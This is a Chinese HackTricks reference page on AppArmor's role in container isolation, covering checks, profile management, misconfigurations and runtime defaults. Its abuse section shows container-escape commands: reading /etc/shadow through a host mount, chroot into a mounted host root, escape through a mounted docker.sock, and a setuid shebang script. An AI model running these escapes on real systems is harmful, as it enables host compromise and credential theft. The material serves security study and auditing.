# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

AppArmor 是一个通过每个程序配置文件施加限制的 **强制访问控制 (Mandatory Access Control)** 系统。与传统的 DAC 检查（高度依赖用户和组的所有权）不同，AppArmor 允许内核对附加到进程本身的策略进行强制执行。在容器环境中，这很重要，因为工作负载可能具有足够的传统权限去尝试某个操作，但仍会被拒绝，原因是其 AppArmor 配置文件不允许相关的路径、挂载、网络行为或 capability 的使用。

最重要的概念性要点是 AppArmor 是 **基于路径** 的。它通过路径规则来判断文件系统访问，而不是像 SELinux 那样通过标签。这使得它更易理解且功能强大，但也意味着 bind mounts 和替代路径布局需要特别注意。如果相同的宿主机内容在不同路径下变得可访问，策略的效果可能与操作员最初预期的不一致。

## 在容器隔离中的作用

容器安全评审通常只检查 capabilities 和 seccomp，但在那些检查之后 AppArmor 仍然很重要。想象一个获得比应有更多权限的容器，或者因运营原因需要额外 capability 的工作负载。AppArmor 仍然可以限制文件访问、挂载行为、网络和执行模式，从而阻断明显的滥用路径。这就是为什么为了“just to get the application working”而禁用 AppArmor，可能会悄然将一个仅有风险的配置变为可被利用的漏洞。

## 实验

要检查 AppArmor 是否在主机上启用，使用：
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
查看当前容器进程以何身份运行：
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
这种区别很有启发。在正常情况下，进程应显示一个与运行时所选 profile 绑定的 AppArmor 上下文。在 unconfined 情况下，这一额外的限制层会消失。

你也可以检查 Docker 认为它应用了什么：
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## 运行时使用

当主机支持时，Docker 可以应用默认或自定义的 AppArmor 配置文件。Podman 在基于 AppArmor 的系统上也可以与 AppArmor 集成，尽管在以 SELinux 为主的发行版上，另一个 MAC 系统通常占据主导。Kubernetes 可以在实际支持 AppArmor 的节点上，将 AppArmor 策略暴露到工作负载层。LXC 以及相关的 Ubuntu 系列系统容器环境也广泛使用 AppArmor。

关键在于 AppArmor 不是一个“Docker 功能”。它是主机内核的特性，多个 runtime 可以选择应用它。如果主机不支持它，或 runtime 被告知以 unconfined 模式运行，那么所谓的保护实际上并不存在。

在支持 Docker 的 AppArmor 主机上，最常见的默认配置是 `docker-default`。该配置文件是由 Moby 的 AppArmor 模板生成的，之所以重要，是因为它解释了为什么一些基于 capability 的 PoC 在默认容器中仍然会失败。大体上，`docker-default` 允许普通的网络操作，拒绝对大部分 `/proc` 的写入，拒绝访问 `/sys` 的敏感部分，阻止挂载操作，并限制 ptrace，使其不能作为通用的主机探测原语。理解这个基线有助于区分“容器具有 `CAP_SYS_ADMIN`”与“容器实际上可以对我关心的内核接口使用该 capability”。

## 配置文件管理

AppArmor 配置文件通常存放在 `/etc/apparmor.d/` 下。一个常见的命名约定是将可执行文件路径中的斜杠替换为点。例如，针对 `/usr/bin/man` 的配置文件通常存放为 `/etc/apparmor.d/usr.bin.man`。这一细节在防御和评估中都很重要，因为一旦你知道了活动配置文件的名称，通常可以在主机上快速定位到相应的文件。

有用的主机端管理命令包括：
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
这些命令在 container-security 参考中之所以重要，是因为它们解释了 profiles 实际上是如何构建、加载、切换到 complain mode，以及在应用变更后如何被修改的。如果操作人员有在排查问题时将 profiles 切换到 complain mode 并忘记恢复 enforcement 的习惯，容器在文档中看起来受保护，但在实际运行中可能表现得松散得多。

### 构建和更新 profiles

`aa-genprof` 可以观察应用行为并以交互方式生成 profile：
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` 可以生成一个模板配置文件，之后可以用 `apparmor_parser` 加载：
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
当二进制文件发生更改并需要更新策略时，`aa-logprof` 可以重放日志中记录的拒绝事件并帮助操作员决定是否允许或拒绝它们：
```bash
sudo aa-logprof
```
### 日志

AppArmor 拒绝通常可以通过 `auditd`、syslog 或诸如 `aa-notify` 之类的工具看到：
```bash
sudo aa-notify -s 1 -v
```
这在操作和进攻场景中都很有用。防御者用它来优化配置文件。攻击者用它来确定哪个具体路径或操作被拒绝，以及是否由 AppArmor 阻止了利用链。

### 确定精确的配置文件文件

当运行时为容器显示了特定的 AppArmor 配置文件名称时，通常有必要将该名称映射回磁盘上的配置文件：
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
这在主机端审核时尤其有用，因为它弥合了“容器显示其在配置文件 `lowpriv` 下运行”和“实际规则位于可以审计或重新加载的此特定文件中”之间的差距。

## 错误配置

最明显的错误是 `apparmor=unconfined`。管理员常在调试某个因为配置文件正确阻止了某些危险或意外行为而失败的应用时设置该项。如果该标志在生产环境中保留，则整个 MAC 层实际上已被移除。

另一个微妙的问题是因为文件权限看起来正常而认为 bind mounts 无害。由于 AppArmor 是基于路径的，将主机路径暴露到替代的挂载位置可能会与路径规则产生不良交互。第三个错误是忘记了，如果主机内核实际上并未强制执行 AppArmor，那么配置文件中的配置文件名意义不大。

## 滥用

当 AppArmor 不再生效时，先前受限的操作可能会突然可行：通过 bind mounts 读取敏感路径、访问本应更难使用的 procfs 或 sysfs 的部分、如果 capabilities/seccomp 也允许则执行与挂载相关的操作，或使用配置文件通常会拒绝的路径。AppArmor 常常是解释为何基于 capability 的越狱尝试在理论上“应该可行”但实际上仍然失败的原因。移除 AppArmor 后，相同的尝试可能会开始成功。

如果你怀疑 AppArmor 是阻止路径遍历、bind-mount，或基于挂载的滥用链的主要因素，第一步通常是比较有无配置文件时哪些内容变得可访问。例如，如果一个主机路径被挂载到容器内部，首先检查你是否可以遍历并读取它：
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
如果容器还具有诸如 `CAP_SYS_ADMIN` 之类的危险权限，其中一个最实用的测试就是确定 AppArmor 是否在阻止挂载操作或访问敏感的内核文件系统：
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
在环境中，当一个 host path 已通过 bind mount 可用时，失去 AppArmor 也可能把一个 read-only information-disclosure 问题变成直接访问主机文件：
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
这些命令的重点并不是说仅凭 AppArmor 就能产生 breakout。重点在于一旦移除了 AppArmor，许多基于文件系统和挂载的滥用路径就能立即被测试。

### Full Example: AppArmor Disabled + Host Root Mounted

如果容器已经在 `/host` 将主机根目录绑定挂载，移除 AppArmor 可以将一个被阻止的文件系统滥用路径转变为完整的 host escape：
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一旦 shell 在 host filesystem 上执行，workload 就已实际逃出 container 边界：
```bash
id
hostname
cat /etc/shadow | head
```
### 完整示例：AppArmor 被禁用 + 运行时 Socket

如果真正的屏障是保护运行时状态的 AppArmor，那么挂载的 socket 就足以实现完全逃逸：
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
确切的路径取决于挂载点，但结果相同：AppArmor 不再阻止对运行时 API 的访问，而运行时 API 可以启动能够危及主机的容器。

### 完整示例：Path-Based Bind-Mount Bypass

因为 AppArmor 是基于路径的，保护 `/proc/**` 并不会自动保护通过不同路径可访问的相同主机 procfs 内容：
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影响取决于究竟挂载了什么，以及替代路径是否也绕过了其他控制，但这种模式是说明为什么必须将 AppArmor 与挂载布局一起评估而不是孤立评估的最明显原因之一。

### 完整示例：Shebang Bypass

AppArmor 策略有时以一种方式针对解释器路径，却没有充分考虑通过 shebang 处理执行脚本的情况。一个历史示例涉及使用一个脚本，其第一行指向一个受限的解释器：
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
这样的示例很重要，用来提醒 profile 的意图与实际执行语义可能会发生偏离。在审查 AppArmor 在 container 环境中的行为时，解释器链和替代执行路径值得特别关注。

## Checks

这些检查的目标是快速回答三个问题：AppArmor 是否在主机上启用、当前进程是否受限，以及 runtime 是否实际对该 container 应用了 profile？
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
有趣的是：

- 如果 `/proc/self/attr/current` 显示 `unconfined`，该工作负载未从 AppArmor 限制中受益。
- 如果 `aa-status` 显示 AppArmor 被禁用或未加载，则运行时配置中的任何配置文件名称在大多数情况下只是表面装饰。
- 如果 `docker inspect` 显示 `unconfined` 或一个意外的自定义配置文件，这通常是文件系统或基于挂载的滥用路径能够奏效的原因。

如果容器因运维原因已经具有提升的权限，保持启用 AppArmor 通常能决定这是一个可控的例外还是更大范围的安全失效。

## 运行时默认值

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Docker Engine | 在支持 AppArmor 的主机上默认启用 | 使用 `docker-default` AppArmor 配置文件，除非被覆盖 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | 依赖主机 | 通过 `--security-opt` 支持 AppArmor，但确切的默认值取决于主机/运行时，并且不如 Docker 文档中 `docker-default` 配置文件那么通用 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 有条件的默认值 | 如果未指定 `appArmorProfile.type`，默认值是 `RuntimeDefault`，但只有在节点上启用了 AppArmor 时才会应用 | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` 使用弱配置文件，节点没有 AppArmor 支持 |
| containerd / CRI-O under Kubernetes | 遵循节点/运行时支持 | 常见的 Kubernetes 支持的运行时支持 AppArmor，但实际执行仍取决于节点支持和工作负载设置 | 与 Kubernetes 行相同；直接的运行时配置也可以完全跳过 AppArmor |

对于 AppArmor 来说，最重要的变量通常是 **主机**，而不仅仅是运行时。清单中的配置文件设置不会在未启用 AppArmor 的节点上创建限制。
{{#include ../../../../banners/hacktricks-training.md}}
